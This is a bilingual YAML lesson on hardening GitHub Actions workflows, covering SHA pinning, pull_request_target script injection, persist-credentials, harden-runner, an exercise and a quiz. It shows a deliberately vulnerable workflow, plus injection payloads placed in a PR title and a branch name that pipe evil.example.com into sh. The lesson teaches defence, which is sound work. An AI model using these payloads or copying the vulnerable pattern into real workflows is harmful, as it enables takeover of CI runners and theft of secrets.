@@ -1,0 +1,583 @@
+description:
+  fr: "Durcir un workflow GitHub Actions : épingler les actions au SHA, éviter l'injection de script via pull_request_target, persist-credentials:false, harden-runner, concurrency et timeout, puis assembler le pipeline complet."
+  en: "Harden a GitHub Actions workflow: pin actions to a full SHA, avoid script injection via pull_request_target, persist-credentials:false, harden-runner, concurrency and timeouts, then assemble the complete pipeline."
+duration: 30
+
+intro:
+  fr: |
+    Vous avez construit, leçon après leçon, un pipeline qui teste, analyse (SAST), scanne les secrets et
+    les dépendances (SCA), teste l'application en marche (DAST) et scanne l'image. Il reste une étape de
+    niveau expert : **durcir** le pipeline lui-même. Car le pipeline est une cible : il a accès au code, aux
+    secrets, aux jetons de déploiement. S'il est compromis, tout l'est.
+
+    Imaginez un coffre-fort dont le contenu est parfait, mais dont la porte reste entrouverte et la
+    combinaison écrite dessus. Durcir, c'est fermer ces portes : empêcher qu'une action tierce malveillante
+    s'exécute (épinglage au **SHA**), qu'une entrée d'attaquant devienne du code (**injection de script**),
+    qu'un jeton traîne sur le disque (**persist-credentials**), ou qu'un job parte en fuite réseau
+    (**harden-runner**).
+
+    Dans cette leçon, vous verrez chaque technique de durcissement, l'opposition **vulnérable vs sécurisé**
+    sur le piège le plus dangereux (l'injection de script via `pull_request_target`), puis vous assemblerez
+    le **workflow complet** qui réunit tout le cours : un pipeline de production, durci de bout en bout.
+  en: |
+    Lesson after lesson, you have built a pipeline that tests, analyses (SAST), scans secrets and
+    dependencies (SCA), tests the running application (DAST) and scans the image. One expert-level step
+    remains: **hardening** the pipeline itself. Because the pipeline is a target: it has access to the code,
+    the secrets, the deployment tokens. If it is compromised, everything is.
+
+    Picture a vault with perfect contents, but whose door stays ajar and whose combination is written on
+    it. Hardening is closing those doors: preventing a malicious third-party action from running (pinning
+    to the **SHA**), an attacker's input from becoming code (**script injection**), a token from lingering
+    on disk (**persist-credentials**), or a job from leaking over the network (**harden-runner**).
+
+    In this lesson you will see each hardening technique, the **vulnerable vs secure** contrast on the most
+    dangerous trap (script injection via `pull_request_target`), then assemble the **complete workflow**
+    that brings the whole course together: a production pipeline, hardened end to end.
+
+sections:
+  - heading:
+      fr: "Épingler les actions au SHA complet"
+      en: "Pinning actions to a full SHA"
+    body:
+      fr: |
+        Quand vous écrivez `uses: actions/checkout@v4`, vous faites confiance à un **tag mobile**. Or un tag
+        peut être **redéplacé** : si le dépôt de l'action est compromis, `v4` peut soudain pointer vers du
+        code malveillant, qui s'exécutera dans **votre** workflow avec accès à vos secrets. C'est une
+        attaque de **chaîne d'approvisionnement** (*supply chain*).
+
+        La parade : épingler chaque action tierce à son **SHA de commit complet** (40 caractères), qui est
+        immuable. On garde le numéro de version en commentaire pour la lisibilité :
+
+        ```yaml
+        - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+        ```
+
+        | Référence | Immuable ? | Risque |
+        |---|---|---|
+        | `@v4` (tag majeur) | Non | Peut être redéplacé vers du code malveillant |
+        | `@v4.1.1` (tag exact) | Non (techniquement) | Un tag reste déplaçable |
+        | `@b4ffde6...` (SHA) | **Oui** | Le contenu ne peut pas changer |
+
+        On épingle **toutes** les actions tierces. Les actions officielles `actions/*` sont les plus fiables,
+        mais la règle vaut d'autant plus pour les actions moins connues. Des outils comme Dependabot ou
+        `pin-github-action` automatisent la mise à jour de ces SHA épinglés.
+      en: |
+        When you write `uses: actions/checkout@v4`, you trust a **moving tag**. But a tag can be
+        **re-pointed**: if the action's repo is compromised, `v4` can suddenly point to malicious code,
+        which will run in **your** workflow with access to your secrets. This is a **supply chain** attack.
+
+        The defence: pin each third-party action to its **full commit SHA** (40 characters), which is
+        immutable. Keep the version number as a comment for readability:
+
+        ```yaml
+        - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+        ```
+
+        | Reference | Immutable? | Risk |
+        |---|---|---|
+        | `@v4` (major tag) | No | Can be re-pointed to malicious code |
+        | `@v4.1.1` (exact tag) | No (technically) | A tag stays movable |
+        | `@b4ffde6...` (SHA) | **Yes** | The content cannot change |
+
+        You pin **all** third-party actions. Official `actions/*` are the most trustworthy, but the rule
+        applies all the more to less-known actions. Tools like Dependabot or `pin-github-action` automate
+        updating these pinned SHAs.
+  - heading:
+      fr: "Injection de script via pull_request_target"
+      en: "Script injection via pull_request_target"
+    body:
+      fr: |
+        Le piège le plus dangereux de GitHub Actions combine deux éléments : le déclencheur
+        **`pull_request_target`** et l'**interpolation d'entrées utilisateur** dans un `run:`.
+
+        - `pull_request` s'exécute **sans** les secrets du dépôt (sûr pour les PR de forks).
+        - `pull_request_target` s'exécute **avec** les secrets et un jeton en écriture, même pour une PR
+          venant d'un fork. C'est utile (commenter une PR externe) mais **dangereux**.
+
+        Le danger devient critique quand on injecte une valeur contrôlée par l'attaquant,
+        `${{ github.event.pull_request.title }}` par exemple, **directement** dans un script shell :
+
+        ```yaml
+        # DANGER
+        - run: echo "Title: ${{ github.event.pull_request.title }}"
+        ```
+
+        Si l'attaquant nomme sa PR `"; curl evil.example.com/x | sh #`, ce texte est **collé tel quel**
+        dans le shell et **exécuté** — avec les secrets du dépôt à portée de main. C'est une **injection de
+        script**.
+
+        La parade : ne **jamais** interpoler `${{ github.event.* }}` dans un `run:`. On passe la valeur par
+        une **variable d'environnement**, que le shell traite comme une donnée, jamais comme du code :
+
+        ```yaml
+        # SAFE
+        - run: echo "Title: $TITLE"
+          env:
+            TITLE: ${{ github.event.pull_request.title }}
+        ```
+
+        La différence est subtile mais totale : `${{ ... }}` est remplacé **avant** l'exécution (le texte
+        devient du script), alors que `$TITLE` est lu **pendant** l'exécution (le texte reste une valeur).
+      en: |
+        GitHub Actions' most dangerous trap combines two elements: the **`pull_request_target`** trigger and
+        the **interpolation of user input** into a `run:`.
+
+        - `pull_request` runs **without** the repo secrets (safe for fork PRs).
+        - `pull_request_target` runs **with** the secrets and a write token, even for a PR from a fork. It
+          is useful (commenting on an external PR) but **dangerous**.
+
+        The danger becomes critical when you inject an attacker-controlled value,
+        `${{ github.event.pull_request.title }}` for instance, **directly** into a shell script:
+
+        ```yaml
+        # DANGER
+        - run: echo "Title: ${{ github.event.pull_request.title }}"
+        ```
+
+        If the attacker names their PR `"; curl evil.example.com/x | sh #`, this text is **pasted as-is**
+        into the shell and **executed** — with the repo secrets within reach. This is a **script
+        injection**.
+
+        The defence: **never** interpolate `${{ github.event.* }}` into a `run:`. Pass the value through an
+        **environment variable**, which the shell treats as data, never as code:
+
+        ```yaml
+        # SAFE
+        - run: echo "Title: $TITLE"
+          env:
+            TITLE: ${{ github.event.pull_request.title }}
+        ```
+
+        The difference is subtle but total: `${{ ... }}` is replaced **before** execution (the text becomes
+        script), whereas `$TITLE` is read **during** execution (the text stays a value).
+  - heading:
+      fr: "persist-credentials, harden-runner, concurrency, timeout"
+      en: "persist-credentials, harden-runner, concurrency, timeout"
+    body:
+      fr: |
+        Quatre durcissements complètent le tableau :
+
+        - **`persist-credentials: false`** sur `actions/checkout` : par défaut, checkout **laisse le jeton
+          Git sur le disque** du runner, ce qui permet à une étape suivante (ou une dépendance malveillante)
+          de pousser du code. On le désactive si l'on n'a pas besoin de pousser.
+
+        - **`step-security/harden-runner`** : un garde en début de job qui surveille les appels **réseau**
+          et peut les bloquer (`egress-policy: block`) sauf vers une liste autorisée. Si une dépendance
+          compromise tente d'exfiltrer vos secrets vers un domaine inconnu, elle est bloquée et vous êtes
+          alerté.
+
+        - **`concurrency`** : annule les exécutions redondantes d'une même branche. Au-delà du coût, cela
+          réduit la fenêtre où plusieurs workflows manipulent les mêmes secrets en parallèle.
+
+        - **`timeout-minutes`** : plafonne la durée d'un job. Sans limite, un job bloqué (ou détourné pour
+          du minage) peut tourner des heures. Un plafond court (par exemple 15) coupe les dérives.
+
+        ```yaml
+        jobs:
+          build:
+            timeout-minutes: 15        # hard cap on the job duration
+            steps:
+              - uses: step-security/harden-runner@... # SHA
+                with:
+                  egress-policy: audit  # start by observing, then switch to block
+              - uses: actions/checkout@... # SHA
+                with:
+                  persist-credentials: false
+        ```
+
+        Avec `concurrency` au niveau du workflow, `cancel-in-progress: true` annule l'ancienne exécution
+        d'une branche dès qu'une nouvelle démarre.
+      en: |
+        Four hardenings complete the picture:
+
+        - **`persist-credentials: false`** on `actions/checkout`: by default, checkout **leaves the Git
+          token on the runner's disk**, which lets a later step (or a malicious dependency) push code.
+          Disable it when you do not need to push.
+
+        - **`step-security/harden-runner`**: a guard at the start of the job that watches **network** calls
+          and can block them (`egress-policy: block`) except to an allowed list. If a compromised dependency
+          tries to exfiltrate your secrets to an unknown domain, it is blocked and you are alerted.
+
+        - **`concurrency`**: cancels redundant runs of the same branch. Beyond cost, it reduces the window
+          where several workflows handle the same secrets in parallel.
+
+        - **`timeout-minutes`**: caps a job's duration. Without a limit, a stuck job (or one hijacked for
+          mining) can run for hours. A short cap (15, say) cuts off drifts.
+
+        ```yaml
+        jobs:
+          build:
+            timeout-minutes: 15        # hard cap on the job duration
+            steps:
+              - uses: step-security/harden-runner@... # SHA
+                with:
+                  egress-policy: audit  # start by observing, then switch to block
+              - uses: actions/checkout@... # SHA
+                with:
+                  persist-credentials: false
+        ```
+
+        With `concurrency` at the workflow level, `cancel-in-progress: true` cancels a branch's older run as
+        soon as a new one starts.
+
+examples:
+  - title:
+      fr: "Vulnérable : injection de script via le titre de PR"
+      en: "Vulnerable: script injection via the PR title"
+    file: .github/workflows/greet-bad.yml
+    lang: yaml
+    kind: vulnerable
+    code: |
+      name: greet
+      # pull_request_target runs WITH the repo secrets, even for fork PRs
+      on: [pull_request_target]
+
+      jobs:
+        greet:
+          runs-on: ubuntu-latest
+          steps:
+            # DANGER: the PR title is attacker-controlled and is pasted directly
+            # into the shell. A title like  "; curl evil.example.com | sh #
+            # is interpreted as commands, with the repo secrets in reach.
+            - run: echo "Thanks for PR titled ${{ github.event.pull_request.title }}"
+    note:
+      fr: "`${{ ... }}` est substitué **avant** l'exécution : le titre devient littéralement du script shell. Combiné à `pull_request_target` (qui donne accès aux secrets), c'est une prise de contrôle complète du runner par quiconque ouvre une PR. Ne jamais interpoler `github.event.*` dans un `run:`."
+      en: "`${{ ... }}` is substituted **before** execution: the title literally becomes shell script. Combined with `pull_request_target` (which grants access to secrets), it is a full takeover of the runner by anyone who opens a PR. Never interpolate `github.event.*` into a `run:`."
+
+  - title:
+      fr: "Sécurisé : la valeur passe par une variable d'environnement"
+      en: "Secure: the value goes through an environment variable"
+    file: .github/workflows/greet-good.yml
+    lang: yaml
+    kind: secure
+    code: |
+      name: greet
+      on: [pull_request_target]
+
+      permissions:
+        pull-requests: write   # only what is needed to comment
+
+      jobs:
+        greet:
+          runs-on: ubuntu-latest
+          steps:
+            # SAFE: the title is read at runtime as a plain value, never as code.
+            # The shell sees $TITLE as data; it cannot execute its content.
+            - run: echo "Thanks for PR titled $TITLE"
+              env:
+                TITLE: ${{ github.event.pull_request.title }}
+    note:
+      fr: "Même déclencheur, mais la valeur transite par `env.TITLE`. Le shell lit `$TITLE` **pendant** l'exécution comme une donnée : un titre piégé reste du texte inoffensif. C'est la règle d'or : toute entrée `github.event.*` passe par `env`, jamais directement dans `run:`."
+      en: "Same trigger, but the value travels through `env.TITLE`. The shell reads `$TITLE` **during** execution as data: a booby-trapped title stays harmless text. This is the golden rule: every `github.event.*` input goes through `env`, never directly into `run:`."
+
+  - title:
+      fr: "Durcissements : SHA, harden-runner, persist-credentials, timeout"
+      en: "Hardenings: SHA, harden-runner, persist-credentials, timeout"
+    file: .github/workflows/hardened-job.yml
+    lang: yaml
+    kind: secure
+    code: |
+      name: build
+      on: [pull_request]
+
+      # Cancel a branch's older run when a new one starts
+      concurrency:
+        group: build-${{ github.ref }}
+        cancel-in-progress: true
+
+      permissions:
+        contents: read
+
+      jobs:
+        build:
+          runs-on: ubuntu-latest
+          timeout-minutes: 15        # a stuck or hijacked job cannot run for hours
+          steps:
+            # Watch (and later block) outbound network calls from the runner
+            - uses: step-security/harden-runner@0d381219ddf674d61a7572ddd19d7941e271515c # v2.9.0
+              with:
+                egress-policy: audit
+            # Pinned to a full SHA: the content cannot be swapped under the tag
+            - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+              with:
+                persist-credentials: false   # do not leave the Git token on disk
+            - run: ./build.sh
+    note:
+      fr: "Quatre protections cumulées : `harden-runner` surveille le réseau, `checkout` est épinglé au SHA (immuable), `persist-credentials: false` retire le jeton du disque, `timeout-minutes` plafonne la durée et `concurrency` annule les runs redondants. Chacune ferme une porte différente."
+      en: "Four stacked protections: `harden-runner` watches the network, `checkout` is pinned to the SHA (immutable), `persist-credentials: false` removes the token from disk, `timeout-minutes` caps the duration and `concurrency` cancels redundant runs. Each closes a different door."
+
+  - title:
+      fr: "Le pipeline complet, durci de bout en bout"
+      en: "The complete pipeline, hardened end to end"
+    file: .github/workflows/secure-pipeline.yml
+    lang: yaml
+    kind: secure
+    code: |
+      name: secure-pipeline
+      on:
+        pull_request:
+        push:
+          branches: [main]
+
+      # One run per branch; cancel the previous one
+      concurrency:
+        group: pipeline-${{ github.ref }}
+        cancel-in-progress: true
+
+      # Least privilege by default; jobs widen only what they need
+      permissions:
+        contents: read
+
+      jobs:
+        test:
+          runs-on: ubuntu-latest
+          timeout-minutes: 15
+          steps:
+            - uses: step-security/harden-runner@0d381219ddf674d61a7572ddd19d7941e271515c # v2.9.0
+              with:
+                egress-policy: audit
+            - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+              with:
+                persist-credentials: false
+            - uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b # v5.3.0
+              with:
+                python-version: "3.12"
+                cache: "pip"
+            - run: pip install -r requirements.txt
+            - run: pytest -q
+
+        sast:
+          runs-on: ubuntu-latest
+          timeout-minutes: 15
+          permissions:
+            contents: read
+            security-events: write
+          steps:
+            - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+              with:
+                persist-credentials: false
+            - uses: github/codeql-action/init@2bbafcdd7fbf96243689e764c2f15d9735164f33 # v3.26.0
+              with:
+                languages: python
+            - uses: github/codeql-action/analyze@2bbafcdd7fbf96243689e764c2f15d9735164f33 # v3.26.0
+
+        supply-chain:
+          runs-on: ubuntu-latest
+          timeout-minutes: 15
+          steps:
+            - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+              with:
+                fetch-depth: 0
+                persist-credentials: false
+            - name: Secret scan
+              uses: gitleaks/gitleaks-action@83373cf2f8c4db6e24b41c1a9b086bb9619e9cd3 # v2.3.6
+              env:
+                GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+            - name: Dependency and file scan
+              uses: aquasecurity/trivy-action@915b19bbe73b92a6cf82a1bc12b087c9a19a5fe2 # 0.28.0
+              with:
+                scan-type: fs
+                scan-ref: .
+                severity: HIGH,CRITICAL
+                exit-code: "1"
+
+        deploy:
+          needs: [test, sast, supply-chain]   # only deploy if every check passed
+          if: github.ref == 'refs/heads/main'
+          runs-on: ubuntu-latest
+          timeout-minutes: 15
+          environment: production             # required reviewers approve first
+          permissions:
+            id-token: write                   # OIDC, no stored AWS key
+            contents: read
+          steps:
+            - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+              with:
+                persist-credentials: false
+            - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
+              with:
+                role-to-assume: arn:aws:iam::123456789012:role/github-deploy
+                aws-region: eu-west-1
+            - run: aws s3 sync ./dist s3://example-bucket
+    note:
+      fr: "Le pipeline complet réunit tout le cours : moindre privilège, actions épinglées au SHA, `persist-credentials: false`, `harden-runner`, `timeout`, `concurrency`. Le job `deploy` n'attend que si `test`, `sast` et `supply-chain` réussissent (`needs`), ne tourne que sur `main`, exige une approbation (`environment: production`) et déploie en OIDC sans clé stockée. C'est un modèle de pipeline de production."
+      en: "The complete pipeline brings the whole course together: least privilege, actions pinned to the SHA, `persist-credentials: false`, `harden-runner`, `timeout`, `concurrency`. The `deploy` job runs only if `test`, `sast` and `supply-chain` pass (`needs`), only on `main`, requires approval (`environment: production`) and deploys via OIDC with no stored key. It is a production pipeline template."
+
+mistake:
+  fr: |
+    **Interpoler une entrée utilisateur dans un `run:`, ou faire confiance à un tag d'action mobile.**
+
+    Deux failles de pipeline parmi les plus exploitées. Écrire `${{ github.event.pull_request.title }}`
+    directement dans un `run:` transforme une entrée d'attaquant en code exécuté — critique sous
+    `pull_request_target` qui a accès aux secrets. Passez toujours par une variable d'`env`. De même,
+    `uses: some/action@v3` fait confiance à un tag qui peut être redéplacé vers du code malveillant : seul
+    l'épinglage au **SHA complet** garantit que le contenu ne changera pas sous vos pieds.
+  en: |
+    **Interpolating user input into a `run:`, or trusting a moving action tag.**
+
+    Two of the most exploited pipeline flaws. Writing `${{ github.event.pull_request.title }}` directly in
+    a `run:` turns attacker input into executed code — critical under `pull_request_target`, which has
+    access to the secrets. Always go through an `env` variable. Likewise, `uses: some/action@v3` trusts a
+    tag that can be re-pointed to malicious code: only pinning to the **full SHA** guarantees the content
+    will not change under your feet.
+
+bestPractice:
+  fr: |
+    - **Épinglez toutes les actions tierces au SHA complet**, le numéro de version en commentaire.
+    - **Ne mettez jamais `github.event.*` dans un `run:`** : passez par une variable d'environnement.
+    - **Méfiez-vous de `pull_request_target`** : il a accès aux secrets, même pour une PR de fork.
+    - **Ajoutez `persist-credentials: false`** à `checkout` quand vous n'avez pas besoin de pousser.
+    - **Posez `harden-runner`, `timeout-minutes` et `concurrency`** sur chaque job sérieux.
+    - **Gardez le moindre privilège** : `contents: read` par défaut, `needs` + `environment` pour déployer.
+    - **Déployez en OIDC** plutôt qu'avec une clé stockée.
+  en: |
+    - **Pin all third-party actions to the full SHA**, the version number as a comment.
+    - **Never put `github.event.*` in a `run:`**: go through an environment variable.
+    - **Be wary of `pull_request_target`**: it has access to the secrets, even for a fork PR.
+    - **Add `persist-credentials: false`** to `checkout` when you do not need to push.
+    - **Set `harden-runner`, `timeout-minutes` and `concurrency`** on every serious job.
+    - **Keep least privilege**: `contents: read` by default, `needs` + `environment` to deploy.
+    - **Deploy with OIDC** rather than a stored key.
+
+exercise:
+  statement:
+    fr: |
+      Un collègue a écrit ce step, déclenché par `pull_request_target`, pour souhaiter la bienvenue en
+      utilisant le **nom de la branche** de la PR :
+
+      ```yaml
+      - run: echo "Welcome, branch ${{ github.event.pull_request.head.ref }}"
+      ```
+
+      1. Expliquez précisément pourquoi ce step est dangereux.
+      2. Réécrivez-le de façon sûre.
+      3. Ajoutez à son job deux durcissements vus dans la leçon : l'épinglage de `checkout` au SHA et la
+         suppression du jeton Git du disque.
+    en: |
+      A colleague wrote this step, triggered by `pull_request_target`, to welcome contributors using the
+      PR's **branch name**:
+
+      ```yaml
+      - run: echo "Welcome, branch ${{ github.event.pull_request.head.ref }}"
+      ```
+
+      1. Explain precisely why this step is dangerous.
+      2. Rewrite it safely.
+      3. Add to its job two hardenings seen in the lesson: pinning `checkout` to the SHA and removing the
+         Git token from disk.
+  solution:
+    file: solution.yml
+    lang: yaml
+    code: |
+      # 1. WHY DANGEROUS: head.ref is attacker-controlled (they name the branch).
+      #    With ${{ ... }} it is pasted into the shell BEFORE execution, so a branch
+      #    named  $(curl evil.example.com | sh)  runs commands. Under
+      #    pull_request_target the job holds the repo secrets -> full takeover.
+
+      jobs:
+        welcome:
+          runs-on: ubuntu-latest
+          steps:
+            # 3. checkout pinned to the full SHA, token not left on disk
+            - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+              with:
+                persist-credentials: false
+            # 2. SAFE: the branch name is read at runtime as plain data via env
+            - run: echo "Welcome, branch $BRANCH"
+              env:
+                BRANCH: ${{ github.event.pull_request.head.ref }}
+    note:
+      fr: "Le cœur de la correction : sortir `github.event.*` du `run:` et le passer par `env`, pour que le shell le lise comme une valeur et non comme du code. L'épinglage au SHA et `persist-credentials: false` referment deux autres portes du même job."
+      en: "The heart of the fix: move `github.event.*` out of the `run:` and pass it through `env`, so the shell reads it as a value, not as code. Pinning to the SHA and `persist-credentials: false` close two other doors of the same job."
+
+quiz:
+  - q:
+      fr: "Pourquoi épingler une action à son SHA complet plutôt qu'à `@v4` ?"
+      en: "Why pin an action to its full SHA rather than to `@v4`?"
+    options:
+      fr:
+        - "Parce qu'un tag peut être redéplacé vers du code malveillant, pas un SHA"
+        - "Parce que le SHA s'exécute plus vite"
+        - "Parce que `@v4` est payant"
+        - "Parce que le SHA chiffre les secrets"
+      en:
+        - "Because a tag can be re-pointed to malicious code, a SHA cannot"
+        - "Because the SHA runs faster"
+        - "Because `@v4` is paid"
+        - "Because the SHA encrypts the secrets"
+    answer: 0
+    why:
+      fr: "Un tag est mobile : si le dépôt de l'action est compromis, `v4` peut pointer vers du code malveillant. Le SHA de commit est immuable, le contenu ne peut pas changer."
+      en: "A tag is movable: if the action's repo is compromised, `v4` can point to malicious code. The commit SHA is immutable, the content cannot change."
+  - q:
+      fr: "Pourquoi `${{ github.event.pull_request.title }}` dans un `run:` est-il dangereux ?"
+      en: "Why is `${{ github.event.pull_request.title }}` inside a `run:` dangerous?"
+    options:
+      fr:
+        - "Parce qu'il ralentit le job"
+        - "Parce que le titre, contrôlé par l'attaquant, est collé comme du code avant l'exécution"
+        - "Parce qu'il révèle le nom du dépôt"
+        - "Parce qu'il désactive le cache"
+      en:
+        - "Because it slows the job down"
+        - "Because the title, attacker-controlled, is pasted as code before execution"
+        - "Because it reveals the repo name"
+        - "Because it disables the cache"
+    answer: 1
+    why:
+      fr: "`${{ ... }}` est substitué avant l'exécution : un titre piégé devient du script shell. C'est une injection de script, critique sous `pull_request_target`."
+      en: "`${{ ... }}` is substituted before execution: a booby-trapped title becomes shell script. It is a script injection, critical under `pull_request_target`."
+  - q:
+      fr: "Comment passer une entrée utilisateur à un `run:` sans risque d'injection ?"
+      en: "How do you pass user input to a `run:` without injection risk?"
+    options:
+      fr:
+        - "En la mettant entre guillemets simples dans le `run:`"
+        - "En la convertissant en majuscules"
+        - "En la stockant dans un secret"
+        - "En la passant par une variable d'environnement (`env:`)"
+      en:
+        - "By quoting it with single quotes in the `run:`"
+        - "By converting it to uppercase"
+        - "By storing it in a secret"
+        - "By passing it through an environment variable (`env:`)"
+    answer: 3
+    why:
+      fr: "Via `env:`, le shell lit la valeur pendant l'exécution comme une donnée inerte, jamais comme du code à interpréter."
+      en: "Through `env:`, the shell reads the value during execution as inert data, never as code to interpret."
+  - q:
+      fr: "Que fait `persist-credentials: false` sur `actions/checkout` ?"
+      en: "What does `persist-credentials: false` do on `actions/checkout`?"
+    options:
+      fr:
+        - "Il empêche de laisser le jeton Git sur le disque du runner"
+        - "Il désactive le cache des dépendances"
+        - "Il supprime l'historique Git"
+        - "Il chiffre le dépôt"
+      en:
+        - "It prevents leaving the Git token on the runner's disk"
+        - "It disables the dependency cache"
+        - "It removes the Git history"
+        - "It encrypts the repo"
+    answer: 0
+    why:
+      fr: "Par défaut, checkout laisse un jeton sur le disque, exploitable par une étape ultérieure. Le désactiver retire cette surface d'attaque quand on n'a pas besoin de pousser."
+      en: "By default, checkout leaves a token on disk, usable by a later step. Disabling it removes this attack surface when you do not need to push."
+  - q:
+      fr: "À quoi sert `step-security/harden-runner` dans un job ?"
+      en: "What is `step-security/harden-runner` for in a job?"
+    options:
+      fr:
+        - "À accélérer le téléchargement des dépendances"
+        - "À surveiller et bloquer les appels réseau sortants du runner"
+        - "À signer automatiquement les commits"
+        - "À créer une matrice de versions"
+      en:
+        - "To speed up dependency downloads"
+        - "To watch and block the runner's outbound network calls"
+        - "To sign commits automatically"
+        - "To create a version matrix"
+    answer: 1
+    why:
+      fr: "`harden-runner` observe (ou bloque) le trafic sortant : si une dépendance compromise tente d'exfiltrer des secrets vers un domaine inconnu, elle est stoppée et vous êtes alerté."
+      en: "`harden-runner` observes (or blocks) outbound traffic: if a compromised dependency tries to exfiltrate secrets to an unknown domain, it is stopped and you are alerted."
